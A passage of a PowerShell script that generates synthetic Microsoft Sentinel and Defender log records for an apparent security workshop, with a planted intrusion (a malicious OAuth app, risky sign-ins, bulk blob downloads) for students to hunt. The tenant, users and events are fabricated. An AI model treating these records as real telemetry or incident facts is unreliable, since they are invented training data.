                $values.InternalLogonType = if ($officeTemplate.UserType -eq 'Admin') { 1 } else { 0 }
                $values.MailboxGuid = New-StableGuid "office-mailbox|$($officeUser.Name)"
                $values.MailboxOwnerUPN = $officeUser.Upn
                $values.MailboxOwnerSid = $officeUser.Sid
                $values.LogonUserSid = $officeUser.Sid
                $values.ClientInfoString = @('Client=REST;Client=RESTSystem;;', 'Client=OutlookService;Outlook-iOS/2.0;')[$Index % 2]
                $values.Client_IPAddress = $officeClientIp -replace '^\[|\]:\d+$', ''
                $values.MailboxOwnerMasterAccountSid = 'S-1-5-10'
                $values.MessageId = [string](1782900000000 + ($Index * 977))
                $values.OperationProperties = [object[]]@(
                    @{ Name = 'MailAccessType'; Value = 'Bind' }
                    @{ Name = 'IsSucceeded'; Value = 'True' }
                )
                $values.Folders = [object[]]@(
                    @{
                        FolderItems = [object[]]@(@{ ClientRequestId = (New-StableGuid "office-folder-item|$Index"); InternetMessageId = ('<{0}@usag-cyber.local>' -f (New-StableHex "office-imid|$Index" 20)) })
                        Id = 'LgAAAAD{0}' -f (New-StableHex "office-folder|$Index" 24)
                        Path = '\Inbox'
                    }
                )
                $values.Item = @{
                    Id = 'LgAAAAD{0}' -f (New-StableHex "office-item|$Index" 28)
                    Subject = 'Quarterly access review'
                    ParentFolder = @{ Path = '\Inbox' }
                }
            }

            if ($officeTemplate.Workload -eq 'SharePoint') {
                $values.EventSource = 'SharePoint'
                $values.ItemType = 'File'
                $values.Site_ = New-StableGuid "office-site|$($Index % 4)"
                $values.Site_Url = 'https://usagcyber.sharepoint.com/sites/Engineering/'
                $values.Site_Url_ = $values.Site_Url
                $values.SourceRelativeUrl = 'Shared Documents/Engineering'
                $values.SourceRelativeUrl_ = $values.SourceRelativeUrl
                $values.SourceFileName = 'network-diagram-{0}.vsdx' -f (($Index * 7) % 500)
                $values.SourceFileName_ = $values.SourceFileName
                $values.SourceFileExtension = 'vsdx'
                $values.DestinationRelativeUrl = 'Shared Documents/Archive'
                $values.DestinationFileName = $values.SourceFileName
                $values.ListItemUniqueId = New-StableGuid "office-list-item|$Index"
                $values.OperationScope = 'Site'
                $values.TargetUserOrGroupName = 'SHAREPOINT\system'
                $values.TargetUserOrGroupType = 'SecurityGroup'
                $values.ModifiedProperties = [object[]]@(@{ Name = 'SiteAccess'; NewValue = 'False'; OldValue = 'True' })
                $values.Event_Data = '<Group>Site Owners</Group><GroupId>3</GroupId>'
            }

            if ($officeTemplate.Workload -eq 'MicrosoftTeams') {
                $values.TeamName = 'Engineering'
                $values.TeamGuid = New-StableGuid "office-team|$($Index % 3)"
                $values.ChannelType = 'Standard'
                $values.ChannelName = 'General'
                $values.ChannelGuid = '19:{0}@thread.tacv2' -f (New-StableHex "office-channel|$($Index % 3)" 32)
                $values.CommunicationType = 'Team'
                $values.AADGroupId = New-StableGuid "office-aad-group|$($Index % 3)"
                $values.ExtraProperties = [object[]]@()
                $values.ItemName = 'Engineering'
                $values.ChatThreadId = '19:{0}@thread.tacv2' -f (New-StableHex "office-chat|$($Index % 9)" 32)
                $values.OperationScope = 'Chat'
                $values.Members = [object[]]@(@{ OrganizationId = $tenantId; UPN = $officeUser.Upn; Role = 1; DisplayName = $officeUser.DisplayName })
                $values.AddOnType = 'Tab'
                $values.AddonName = 'Notes'
                $values.TabType = 'extension'
                $values.AddOnGuid = New-StableGuid "office-addon|$($Index % 3)"
                $values.AppDistributionMode = 'Store'
            }

            if ($officeTemplate.RecordType -eq 'ExchangeAdmin') {
                $values.Parameters = [object[]]@(
                    @{ Name = 'Identity'; Value = (New-StableGuid "office-parameter|$Index") }
                    @{ Name = 'Confirm'; Value = 'False' }
                )
                $values.OfficeObjectId = '{0}\{1}' -f $tenantDomain, (New-StableGuid "office-object|$($Index % 200)")
            }
        }
        'BehaviorAnalytics' {
            # Shaped from the real BehaviorAnalytics sample: 25 of 30 columns carry data
            # and InvestigationPriority is 0 on 914 of 1000 rows. The inconsistent Logon
            # against LogOn casing is real and is preserved.
            $uebaTemplate = $behaviorAnalyticsCatalog[$Index % $behaviorAnalyticsCatalog.Count]
            $uebaUser = if (($Index % 53) -eq 0) { $victor } else { $users[($Index * 31) % $users.Count] }
            $uebaDevice = $devices[($Index * 11) % $devices.Count]
            $isScenarioUeba = $uebaUser.Name -eq 'victor.alvarez'
            $uebaPriority = if ($isScenarioUeba) { 8 } else { $uebaTemplate.Priority }
            $uebaIp = if ($isScenarioUeba) { $externalIp } else { $uebaDevice.PublicIP }

            $values.TenantId = $tenantId
            $values.SourceRecordId = New-StableGuid "ueba-record|$Index"
            $values.TimeProcessed = Format-WorkshopTime $Time.AddSeconds(45 + ($Index % 200))
            $values.ActivityType = $uebaTemplate.ActivityType
            $values.ActionType = $uebaTemplate.ActionType
            $values.EventSource = $uebaTemplate.EventSource
            $values.SourceSystem = $uebaTemplate.SourceSystem
            $values.UserName = $uebaUser.Name
            $values.UserPrincipalName = $uebaUser.Upn
            $values.SourceIPAddress = $uebaIp
            $values.SourceIPLocation = if ($isScenarioUeba) { 'amsterdam, netherlands' } else { @('boydton, united states', 'cheyenne, united states', 'des moines, united states')[$Index % 3] }
            $values.SourceDevice = $uebaDevice.Name
            $values.DestinationDevice = 'adds01.{0}' -f $corpFqdn
            $values.EventVendor = 'Microsoft'
            $values.EventProductVersion = '1.0'
            $values.ActorName = if (($Index % 40) -eq 0) { 'nt authority\system' } else { $uebaUser.Name }
            $values.TargetName = $uebaUser.Name
            $values.TargetPrincipalName = $uebaUser.Upn
            $values.Device = if ($uebaTemplate.SourceSystem -eq 'AAD') { 'Microsft/AAD' } else { $uebaDevice.Name }
            $values.InvestigationPriority = $uebaPriority
            $values.UsersInsights = @{
                UserType = 'AADID'
                UserId = $uebaUser.ObjectId
                OnPremisesSID = $uebaUser.Sid
                BlastRadius = if ($isScenarioUeba) { 'High' } else { 'Low' }
                IsDormantAccount = 'False'
                IsNewAccount = 'False'
            }
            $values.DevicesInsights = if (($Index % 3) -eq 0) { @{ IsLocalAdmin = 'True'; UserAgentFamily = 'Edge' } } else { @{} }
            $values.ActivityInsights = @{
                LogonMethod = if ($uebaTemplate.SourceSystem -eq 'AAD') { 'Managed Identity' } else { 'Kerberos' }
                EventResult = if ($uebaTemplate.ActionType -like '*Failure*') { 'Failure' } else { 'Success' }
                FirstTimeUserConnectedFromCountry = if ($isScenarioUeba) { 'True' } else { 'False' }
                CountryUncommonlyConnectedFromAmongPeers = if ($isScenarioUeba) { 'True' } else { 'False' }
                ISPUncommonlyUsedInTenant = if ($isScenarioUeba) { 'True' } else { 'False' }
            }
            $values.Type = 'BehaviorAnalytics'
        }
        'UserPeerAnalytics' {
            # Only 8 of 13 columns carry data in the real table. Rank runs 1 to 14.
            $peerUser = $users[($Index * 7) % $users.Count]
            $peer = $users[($Index * 19) % $users.Count]

            $values.TenantId = $tenantId
            $values.AADTenantId = $tenantId
            $values.UserId = $peerUser.ObjectId
            $values.PeerUserId = $peer.ObjectId
            $values.Rank = 1 + ($Index % 14)
            $values.SourceSystem = 'Azure'
            $values.Type = 'UserPeerAnalytics'
        }
        'IntuneDeviceComplianceOrg' {
            # Shaped from the real sample: 27 of 30 columns carry data, OperationName is
            # always DeviceCompliance, and devices not in a grace period carry the
            # sentinel date 9999-12-31 rather than a null.
            $complianceTemplate = $intuneComplianceCatalog[$Index % $intuneComplianceCatalog.Count]
            $mdmDevice = $windowsDevices[($Index * 13) % $windowsDevices.Count]
            $mdmUser = $users[($Index * 17) % $users.Count]
            $isNonCompliant = $complianceTemplate.State -eq 'Not compliant'

            $values.TenantId = $tenantId
            $values.AADTenantId = $tenantId
            $values.OperationName = 'DeviceCompliance'
            $values.Result = if (($Index % 100) -lt 70) { 'None' } else { 'Completed' }
            $values.DeviceName = $mdmDevice.ShortName.ToUpperInvariant()
            $values.UPN = $mdmUser.Upn
            $values.UserEmail = $mdmUser.Upn
            $values.UserName = $mdmUser.DisplayName
            $values.UserId = $mdmUser.ObjectId
            $values.ComplianceState = $complianceTemplate.State
            $values.OS = 'Windows'
            $values.OSDescription = 'Windows'
            $values.OSVersion = @('10.0.26200.8655', '10.0.26200.8246', '10.0.28000.2340')[$Index % 3]
            $values.OwnerType = $complianceTemplate.Owner
            $values.DeviceId = $mdmDevice.DeviceId
            $values.LastContact = Format-WorkshopTime $Time.AddHours(-1 * ($Index % 400))
            $values.SerialNumber = (New-StableHex "intune-serial|$($mdmDevice.ShortName)" 10).ToUpperInvariant()
            $values.ManagementAgents = $complianceTemplate.Agents
            $values.DeviceType = 1
            $values.BatchId = New-StableGuid "intune-batch|$($Index % 180)"
            $values.InGracePeriodUntil = if ($isNonCompliant) { Format-WorkshopTime $Time.AddDays(3) } else { '9999-12-31T23:59:59.0000000Z' }
            $values.DeviceHealthThreatLevel = $complianceTemplate.Threat
            $values.IntuneAccountId = New-StableGuid 'intune-account'
            $values.Stats = @{ RecordCount = 1 + ($Index % 4) }
            $values.SourceSystem = 'Azure'
            $values.Type = 'IntuneDeviceComplianceOrg'
        }
        'AADRiskyUsers' {
            # 14 of 15 columns carry data. Id and CorrelationId are both the user object
            # id in the real table, and OperationName is always the literal "Risky user".
            $riskyUser = if (($Index % 11) -eq 0) { $victor } else { $users[($Index * 23) % $users.Count] }
            $isScenarioRisk = $riskyUser.Name -eq 'victor.alvarez'
            $riskStates = @('atRisk', 'dismissed', 'confirmedSafe', 'remediated')
            $riskState = if ($isScenarioRisk) { 'atRisk' } else { $riskStates[$Index % $riskStates.Count] }

            $values.TenantId = $tenantId
            $values.Id = $riskyUser.ObjectId
            $values.CorrelationId = $riskyUser.ObjectId
            $values.IsDeleted = $false
            $values.IsProcessing = $false
            $values.RiskState = $riskState
            $values.RiskLevel = if ($isScenarioRisk) { 'high' } elseif ($riskState -eq 'atRisk') { 'medium' } else { 'none' }
            $values.RiskDetail = switch ($riskState) {
                'confirmedSafe' { 'adminConfirmedAccountSafe' }
                'remediated' { 'userPerformedSecuredPasswordReset' }
                default { 'none' }
            }
            $values.RiskLastUpdatedDateTime = $timeText
            $values.UserDisplayName = $riskyUser.DisplayName
            $values.UserPrincipalName = $riskyUser.Upn
            $values.OperationName = 'Risky user'
            $values.Type = 'AADRiskyUsers'
        }
        'SentinelHealth' {
            # 14 of 15 columns carry data. Status is Success on 998 of 1000 real rows,
            # which is the point: the rare failure is the coverage gap students hunt for.
            $healthTemplate = $sentinelHealthCatalog[$Index % $sentinelHealthCatalog.Count]
            $ruleName = $sentinelRuleNameCatalog[$Index % $sentinelRuleNameCatalog.Count]
            $isHealthFailure = $healthTemplate.Status -eq 'Failure'
            $healthRuleId = New-StableGuid "sentinel-rule|$ruleName"

            $values.TenantId = $tenantId
            $values.WorkspaceId = $tenantId
            $values.OperationName = $healthTemplate.Operation
            $values.SentinelResourceId = '/subscriptions/{0}/resourceGroups/sentinel/providers/Microsoft.OperationalInsights/workspaces/usag-cyber/providers/Microsoft.SecurityInsights/alertRules/{1}' -f $subscriptionId, $healthRuleId
            $values.SentinelResourceName = $ruleName
            $values.SentinelResourceType = $healthTemplate.ResourceType
            $values.SentinelResourceKind = $healthTemplate.Kind
            $values.Status = $healthTemplate.Status
            $values.Description = if ($isHealthFailure) { 'Rule execution failed' } elseif ($healthTemplate.ResourceType -eq 'Data connector') { 'Data fetch succeeded' } else { 'Rule executed successfully, but did not reach the alert threshold' }
            $values.Reason = if ($isHealthFailure) { 'The analytics rule execution encountered an error and did not complete.' } else { 'The analytics rule executed successfully. There were no results that matched the rule query.' }
            $values.RecordId = New-StableGuid "sentinel-health|$Index"
            $values.ExtendedProperties = @{
                QueryFrequency = if ($healthTemplate.Kind -eq 'Scheduled') { 'PT1H' } else { $null }
                AggregationKind = 'SingleAlert'
                RuleId = $healthRuleId
                Severity = 'Medium'
            }
            $values.Type = 'SentinelHealth'
        }
        'Heartbeat' {
            # 30 of 31 columns carry data and every value is effectively fixed per host.
            $hbDevice = $windowsDevices[($Index * 3) % $windowsDevices.Count]
            $hbResourceId = '/subscriptions/{0}/resourcegroups/adds/providers/microsoft.compute/virtualmachines/{1}' -f $subscriptionId, $hbDevice.ShortName

            $values.TenantId = $tenantId
            $values.SourceSystem = 'OpsManager'
            $values.MG = '00000000-0000-0000-0000-000000000001'
            $values.ManagementGroupName = "AOI-$tenantId"
            $values.SourceComputerId = New-StableGuid "heartbeat-computer|$($hbDevice.ShortName)"
            $values.ComputerIP = $hbDevice.PublicIP
            $values.Computer = $hbDevice.Name
            $values.Category = 'Azure Monitor Agent'
            $values.OSType = 'Windows'
            $values.OSName = 'Microsoft Windows Server 2025 Datacenter'
            $values.OSMajorVersion = '10'
            $values.OSMinorVersion = '0'
            $values.Version = '1.41.0.0'
            $values.SCAgentChannel = 'Direct'
            $values.RemoteIPLongitude = -78.27
            $values.RemoteIPLatitude = 36.64
            $values.RemoteIPCountry = 'United States'
            $values.SubscriptionId = $subscriptionId
            $values.ResourceGroup = 'adds'
            $values.ResourceProvider = 'Microsoft.Compute'
            $values.Resource = $hbDevice.ShortName
            $values.ResourceId = $hbResourceId
            $values.ResourceType = 'virtualMachines'
            $values.ComputerEnvironment = 'Azure'
            $values.Solutions = 'SecurityInsights, BehaviorAnalyticsInsights, Security, SecurityCenterFree'
            $values.VMUUID = New-StableGuid "heartbeat-vm|$($hbDevice.ShortName)"
            $values.ComputerPrivateIPs = [object[]]@($hbDevice.IP)
            $values._ResourceId = $hbResourceId
            $values.Type = 'Heartbeat'
        }
        'MicrosoftServicePrincipalSignInLogs' {
            # 21 of 23 columns carry data. AppOwnerTenantId and ResourceOwnerTenantId are
            # Microsoft's first-party tenant on every real row, DurationMs is always 0,
            # and ResultSignature is always SUCCESS.
            $spnResource = $spnSignInResourceCatalog[$Index % $spnSignInResourceCatalog.Count]
            $isMaliciousSpn = ($Index % 41) -eq 0
            $spnName = if ($isMaliciousSpn) { 'USAG Cyber Sync Helper' } else { $spnDisplayNameCatalog[$Index % $spnDisplayNameCatalog.Count] }
            $spnAppId = if ($isMaliciousSpn) { $maliciousOAuthAppId } else { New-StableGuid "spn-app|$spnName" }
            $spnObjectId = if ($isMaliciousSpn) { $maliciousOAuthSpId } else { New-StableGuid "spn-object|$spnName" }

            $values.TenantId = $tenantId
            $values.AppId = $spnAppId
            $values.AppOwnerTenantId = if ($isMaliciousSpn) { $tenantId } else { 'f8cdef31-a31e-4b4a-93e4-5f571e91255a' }
            $values.Category = 'MicrosoftServicePrincipalSignInLogs'
            $values.CorrelationId = New-StableGuid "spn-correlation|$Index"
            $values.CreatedDateTime = $timeText
            $values.DurationMs = 0
            $values.OperationName = 'Sign-in activity'
            $values.OperationVersion = '1.0'
            $values.ResourceDisplayName = if ($isMaliciousSpn) { 'Microsoft Graph' } else { $spnResource.Name }
            $values.ResourceIdentity = if ($isMaliciousSpn) { '00000003-0000-0000-c000-000000000000' } else { $spnResource.Id }
            $values.ResourceGroup = 'Microsoft.AADIAM'
            $values.ResourceOwnerTenantId = 'f8cdef31-a31e-4b4a-93e4-5f571e91255a'
            $values.ResourceServicePrincipalId = New-StableGuid "spn-resource|$($spnResource.Name)"
            $values.ResultSignature = 'SUCCESS'
            $values.ServicePrincipalId = $spnObjectId
            $values.ServicePrincipalName = $spnName
            $values.SourceSystem = 'Azure AD'
            $values.UniqueTokenIdentifier = (New-StableHex "spn-token|$Index" 22)
            $values.Type = 'MicrosoftServicePrincipalSignInLogs'
        }
        'AADGraphActivityLogs' {
            # 29 of 34 columns carry data. The actor split is User 512 against
            # Application 488, so half the rows carry UserId and half ServicePrincipalId,
            # exactly as the real table does.
            $graphTemplate = $graphActivityCatalog[$Index % $graphActivityCatalog.Count]
            $isApplicationActor = ($Index % 2) -eq 0
            $graphUser = $users[($Index * 29) % $users.Count]
            $isMaliciousGraph = ($Index % 47) -eq 0

            $values.TenantId = $tenantId
            $values.AADTenantId = $tenantId
            $values.TimeRequested = Format-WorkshopTime $Time.AddMilliseconds(-1 * (20 + ($Index % 300)))
            $values.Location = @('eastus', 'WestUS', 'NorthCentralUS', 'westeurope')[$Index % 4]
            $values.RequestId = New-StableGuid "graph-request|$Index"
            $values.OperationName = 'AAD Graph Activity'
            $values.Category = 'AzureADGraphActivityLogs'
            $values.ApiVersion = $graphTemplate.ApiVersion
            $values.DurationMs = 40 + ($Index % 160)
            $values.RequestMethod = $graphTemplate.Method
            $values.ResponseStatusCode = $graphTemplate.Status
            $values.ResponseSizeBytes = @(97, 2995, 3050, 512)[$Index % 4]
            $values.SignInActivityId = New-StableGuid "graph-signin|$($Index % 580)"
            $values.TokenIssuedAt = Format-WorkshopTime $Time.AddMinutes(-1 * (5 + ($Index % 55)))
            $values.ActorType = if ($isApplicationActor) { 'Application' } else { 'User' }
            $values.AppId = if ($isMaliciousGraph) { $maliciousOAuthAppId } else { New-StableGuid "graph-app|$($Index % 18)" }
            $values.ClientAuthMethod = 0
            $values.CallerIpAddress = if ($isMaliciousGraph) { $externalIp } else { '4.156.{0}.{1}' -f (($Index * 7) % 256), (1 + (($Index * 13) % 254)) }
            $values.UserAgent = $graphTemplate.Agent
            $values.RequestUri = $graphTemplate.Uri -f $tenantId
            $values.Type = 'AADGraphActivityLogs'

            if ($isApplicationActor) {
                $values.ServicePrincipalId = if ($isMaliciousGraph) { $maliciousOAuthSpId } else { New-StableGuid "graph-spn|$($Index % 14)" }
                $values.IdentityProvider = "https://sts.windows.net/$tenantId/"
            }
            else {
                $values.UserId = $graphUser.ObjectId
                $values.Scopes = @('restricted_user_impersonation', 'user_impersonation', 'Directory.Read.All')[$Index % 3]
                $values.SessionId = New-StableGuid "graph-session|$($Index % 24)"
            }
            if (($Index % 6) -eq 0) {
                $values.Roles = ' Application.Read.All, Directory.Read.All, RoleManagementPolicy.ReadWrite.Directory'
            }
            if (($Index % 6) -eq 1) {
                $values.Wids = ' 62e90394-69f5-4237-9190-012177145e10, 9f06204d-73c1-4d4c-880a-6edb90606fd8'
            }
        }
        'ExposureGraphNodes' {
            # Only 9 columns exist and 7 carry data. Security recommendations are 964 of
            # 1000 real nodes; the scenario asset types are mixed in so attack paths
            # terminate on hosts, identities, and storage that exist elsewhere.
            $nodeTemplate = $exposureNodeCatalog[$Index % $exposureNodeCatalog.Count]
            $nodeDevice = $devices[($Index * 5) % $devices.Count]
            $nodeUser = $users[($Index * 37) % $users.Count]
            $nodeName = switch ($nodeTemplate.Label) {
                'device' { $nodeDevice.Name }
                'user' { $nodeUser.Upn }
                'serviceprincipal' { if (($Index % 23) -eq 0) { 'USAG Cyber Sync Helper' } else { "svc-app-$($Index % 400)" } }
                'container-image' { 'usagcyber.azurecr.io/api:{0}' -f (New-StableHex "node-image|$Index" 8) }
                'microsoft.storage/storageaccounts' { 'usagcyberdata{0}' -f ($Index % 40) }
                default { @('Improper Control of Generation of Code', 'Use of cryptographically weak Pseudo-Random Number Generator', 'Improper limitation of a pathname to a restricted directory')[$Index % 3] }
            }

            $values.NodeId = (New-StableHex "exposure-node|$Index" 32)
            $values.NodeLabel = $nodeTemplate.Label
            $values.NodeName = $nodeName
            $values.Categories = [object[]]$nodeTemplate.Categories
            $values.NodeProperties = @{
                '@odata.type' = '#microsoft.graph.security.dynamicNodeProperties'
                rawData = @{
                    criticalityLevel = if ($nodeTemplate.Label -eq 'device') { 1 } else { 3 }
                    exposureScore = 10 + ($Index % 90)
                }
            }
            $values.EntityIds = [object[]]@(
                (ConvertTo-Json -Compress -InputObject @{ type = 'AzureResourceId'; id = ('/subscriptions/{0}/resourceGroups/usag-cyber/providers/{1}' -f $subscriptionId, $nodeTemplate.Label) })
            )
            $values.Type = 'ExposureGraphNodes'
        }
        'ExposureGraphEdges' {
            # The real table times out through the advanced hunting API, so the shape
            # comes from live getschema rather than a field profile. Edges reference the
            # same node id space that ExposureGraphNodes generates.
            $edgeLabel = $exposureEdgeLabelCatalog[$Index % $exposureEdgeLabelCatalog.Count]
            $sourceTemplate = $exposureNodeCatalog[$Index % $exposureNodeCatalog.Count]
            $targetTemplate = $exposureNodeCatalog[($Index + 3) % $exposureNodeCatalog.Count]
            $edgeDevice = $devices[($Index * 5) % $devices.Count]
            $edgeUser = $users[($Index * 37) % $users.Count]

            $values.EdgeId = (New-StableHex "exposure-edge|$Index" 32)
            $values.EdgeLabel = $edgeLabel
            $values.SourceNodeId = (New-StableHex "exposure-node|$Index" 32)
            $values.SourceNodeName = if ($sourceTemplate.Label -eq 'user') { $edgeUser.Upn } else { $edgeDevice.Name }
            $values.SourceNodeLabel = $sourceTemplate.Label
            $values.SourceNodeCategories = [object[]]$sourceTemplate.Categories
            $values.TargetNodeId = (New-StableHex "exposure-node|$($Index + 3)" 32)
            $values.TargetNodeName = if ($targetTemplate.Label -eq 'serviceprincipal') { 'USAG Cyber Sync Helper' } else { 'usagcyberdata{0}' -f ($Index % 40) }
            $values.TargetNodeLabel = $targetTemplate.Label
            $values.TargetNodeCategories = [object[]]$targetTemplate.Categories
            $values.EdgeProperties = @{
                '@odata.type' = '#microsoft.graph.security.dynamicEdgeProperties'
                rawData = @{ accessType = $edgeLabel; isDirect = (($Index % 3) -eq 0) }
            }
            $values.TenantId = $tenantId
            $values.SourceSystem = 'Azure'
            $values.Type = 'ExposureGraphEdges'
        }
        'CloudStorageAggregatedEvents' {
            # 34 of 37 columns carry data. Rows are hourly aggregates, so the start and
            # end times bracket a whole hour, and AccountType is App on 662 of the 664
            # rows that carry account detail.
            $storageTemplate = $cloudStorageOperationCatalog[$Index % $cloudStorageOperationCatalog.Count]
            $aggStart = $Time.Date.AddHours($Time.Hour)
            $isBulkCollection = ($Index % 43) -eq 0 -and $storageTemplate.Operation -eq 'GetBlob'
            $storageAccountName = @('usagcyberdata', 'usagcyberbackup', 'usagcyberarchive')[$Index % 3]
            $opsCount = if ($isBulkCollection) { 400 + ($Index % 600) } else { 1 + ($Index % 6) }
            $storageResourceId = '/subscriptions/{0}/resourceGroups/storage/providers/Microsoft.Storage/storageAccounts/{1}' -f $subscriptionId, $storageAccountName

            $values.DataAggregationStartTime = Format-WorkshopTime $aggStart
            $values.DataAggregationEndTime = Format-WorkshopTime $aggStart.AddHours(1)
            $values.DataSource = 'Azure Storage'
            $values.SubscriptionId = $subscriptionId
            $values.ResourceGroup = 'storage'
            $values.StorageAccount = $storageAccountName
            $values.StorageContainer = @('engineering', 'finance', 'hr-archive', '$purview')[$Index % 4]
            $values.ServiceType = $storageTemplate.Service
            $values.IPAddress = if ($isBulkCollection) { $externalIp } else { '10.0.{0}.{1}' -f (($Index * 3) % 256), (1 + (($Index * 7) % 254)) }
            $values.UserAgentHeader = if ($isBulkCollection) { 'azcopy/10.24.0' } else { @('SRP/1.0', 'Azure-Storage/11.2.3 (.NET Core; Unix 6.6.13)')[$Index % 2] }
            $values.OperationNamesList = $storageTemplate.Operation
            $values.AuthenticationType = $storageTemplate.Auth
            $values.AccountObjectId = if ($isBulkCollection) { $maliciousOAuthSpId } else { New-StableGuid "storage-account-object|$($Index % 14)" }
            $values.AccountTenantId = $tenantId
            $values.AccountApplicationId = if ($isBulkCollection) { $maliciousOAuthAppId } else { New-StableGuid "storage-app|$($Index % 15)" }
            $values.AccountType = 'App'
            $values.OperationsCount = $opsCount
            $values.SuccessfulOperationsCount = if ($isBulkCollection) { $opsCount } else { $Index % 2 }
            $values.FailedOperationsCount = if ($isBulkCollection) { 0 } else { $Index % 3 }
            $values.TotalResponseLength = if ($isBulkCollection) { $opsCount * 524288 } else { 0 }
            $values.SuccessfulReadOperations = if ($isBulkCollection) { $opsCount } else { 0 }
            $values.DistinctGetOperations = if ($isBulkCollection) { $opsCount } else { 0 }
            $values.AnonymousSuccessfulOperations = 0
            $values.HasAnonymousResourceNotFoundFailures = 0
            $values.AzureResourceId = $storageResourceId
            $values.Location = @('eastus2', 'eastus', 'westus2')[$Index % 3]
            $values.ReportId = New-StableGuid "storage-report|$Index"
            $values.ActionType = 'Data Aggregation'
            $values.AdditionalFields = @{
                '@odata.type' = '#microsoft.graph.security.dynamicAdditionalFields'
                BlobCount = $opsCount
            }
            $values.Type = 'CloudStorageAggregatedEvents'
        }
        'AzureDiagnostics' {
            # 73 of 170 columns carry data. Logic App workflow runtime is 985 of 1000
            # real rows, so the tail providers stay rare here too.
            $diagTemplate = $azureDiagnosticsCatalog[$Index % $azureDiagnosticsCatalog.Count]
            $diagResourceName = switch ($diagTemplate.Provider) {
                'MICROSOFT.LOGIC' { 'PLAYBOOK-ISOLATE-DEVICE' }
                'MICROSOFT.KEYVAULT' { 'USAGCYBER-KV' }
                'MICROSOFT.NETWORK' { 'USAGCYBER-NSG' }
                default { 'USAGCYBER-AI' }
            }
            $diagResourceId = '/SUBSCRIPTIONS/{0}/RESOURCEGROUPS/{1}/PROVIDERS/{2}/{3}/{4}' -f $subscriptionId.ToUpperInvariant(), $diagTemplate.ResourceGroup, $diagTemplate.Provider, $diagTemplate.ResourceType, $diagResourceName

            $values.TenantId = $tenantId
            $values.ResourceId = $diagResourceId
            $values.Category = $diagTemplate.Category
            $values.ResourceGroup = $diagTemplate.ResourceGroup
            $values.SubscriptionId = $subscriptionId
            $values.ResourceProvider = $diagTemplate.Provider
            $values.Resource = $diagResourceName
            $values.ResourceType = $diagTemplate.ResourceType
            $values.OperationName = switch ($diagTemplate.Category) {
                'WorkflowRuntime' { 'Microsoft.Logic/workflows/workflowRunAction/completed' }
                'AuditEvent' { 'SecretGet' }
                'NetworkSecurityGroupEvent' { 'NetworkSecurityGroupCounters' }
                default { 'ChatCompletions_Create' }
            }
            $values.OperationVersion = '2019-05-01'
            $values.ResultType = if (($Index % 50) -eq 0) { 'Failed' } else { 'Succeeded' }
            $values.ResultSignature = if (($Index % 50) -eq 0) { '500' } else { '200' }
            $values.Level = if (($Index % 50) -eq 0) { 'Error' } else { 'Information' }
            $values.DurationMs = 20 + ($Index % 4000)
            $values.CorrelationId = New-StableGuid "diag-correlation|$($Index % 300)"
            $values.CallerIPAddress = '20.10.{0}.{1}' -f (($Index * 5) % 256), (1 + (($Index * 11) % 254))
            $values.Location = @('eastus2', 'eastus', 'westus2')[$Index % 3]
            $values.SourceSystem = 'Azure'
            $values._ResourceId = $diagResourceId.ToLowerInvariant()
            $values.Type = 'AzureDiagnostics'

            # Azure Monitor projects resource specific properties into typed suffix
            # columns. Logic App workflow runtime dominates the real table, so those
            # columns are effectively baseline; Key Vault and policy fields are rare.
            $values.location_s = $values.Location
            $values.status_s = if ($values.ResultType -eq 'Failed') { 'Failed' } else { @('Succeeded', 'Running', 'Skipped')[$Index % 3] }
            $values.code_s = if ($values.ResultType -eq 'Failed') { 'ActionFailed' } elseif (($Index % 3) -eq 2) { 'ActionSkipped' } else { 'OK' }

            if ($diagTemplate.Category -eq 'WorkflowRuntime') {
                $runId = '0858416{0:D4}91664268578063097212CU53' -f ($Index % 10000)
                $values.workflowId_s = $diagResourceId
                $values.resource_location_s = $values.Location
                $values.resource_workflowId_g = New-StableGuid "diag-workflow|$diagResourceName"
                $values.resource_resourceGroupName_s = 'Playbook'
                $values.resource_subscriptionId_g = $subscriptionId
                $values.resource_runId_s = $runId
                $values.resource_workflowName_s = 'playbook-isolate-device'
                $values.resource_actionName_s = @('Get_MDE_Device', 'Query_DeviceInfo', 'Isolate_Machine')[$Index % 3]
                $values.correlation_clientTrackingId_s = $runId
                $values.correlation_actionTrackingId_g = New-StableGuid "diag-action|$Index"
                $values._schema_s = '2016-06-01'
                $values.executionClusterType_s = 'AppService'
                $values.tags_purpose_s = 'security-playbook'
                $values.tags_tool_s = 'usagcyber-soar'
                $values.tags_component_s = 'device-isolation'
                $values.tags_trigger_model_s = 'recurrence-watchlist'

                if (($Index % 50) -eq 0) {
                    $values.error_code_s = 'ActionConditionFailed'
                    $values.error_message_s = "The execution of template action 'Get_MDE_Device' skipped: the branch condition was not satisfied."
                }
                if (($Index % 33) -eq 0) {
                    $values.resource_triggerName_s = @('Every_hour', 'Recurrence')[$Index % 2]
                    $values.resource_originRunId_s = $runId
                }
            }

            if ($diagTemplate.Provider -eq 'MICROSOFT.KEYVAULT') {
                $values.id_s = 'https://usagcyber-kv.vault.azure.net/secrets/{0}' -f (New-StableGuid "diag-secret|$($Index % 40)")
                $values.ObjectName_s = New-StableGuid "diag-object|$($Index % 40)"
                $values.ObjectType_s = 'Secret'
                $values.requestUri_s = $values.id_s
                $values.clientInfo_s = 'AzureResourceGraph.IngestionWorkerService'
                $values.identity_claim_appid_g = $maliciousOAuthAppId
                $values.identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g = $maliciousOAuthSpId
                $values.properties_sku_Family_s = 'A'
                $values.properties_sku_Name_s = 'standard'
                $values.properties_tenantId_g = $tenantId
            }

            if (($Index % 100) -eq 0) {
                $values.event_s = 'ShoeboxCallResult'
                $values.Tenant_s = $values.Location
                $values.properties_s = ConvertTo-Json -Compress -InputObject @{ apiName = 'Azure AI Projects API'; statusCode = 200 }
                $values.EvaluationDetails_s = ConvertTo-Json -Compress -InputObject ([object[]]@(@{ AssignmentId = "/subscriptions/$subscriptionId/providers/Microsoft.Authorization/policyAssignments/security-baseline" }))
            }
        }
        'AADRiskyServicePrincipals' {
            # No rows exist in the source tenant, so the shape comes from live getschema
            # plus documented Entra ID Protection values. The malicious application from
            # the OAuth consent act is deliberately the highest-risk principal here.
            $isMaliciousRiskSpn = ($Index % 29) -eq 0
            $riskSpnName = if ($isMaliciousRiskSpn) { 'USAG Cyber Sync Helper' } else { $spnDisplayNameCatalog[$Index % $spnDisplayNameCatalog.Count] }
            $riskSpnStates = @('atRisk', 'dismissed', 'confirmedSafe', 'remediated')
            $riskSpnState = if ($isMaliciousRiskSpn) { 'atRisk' } else { $riskSpnStates[$Index % $riskSpnStates.Count] }

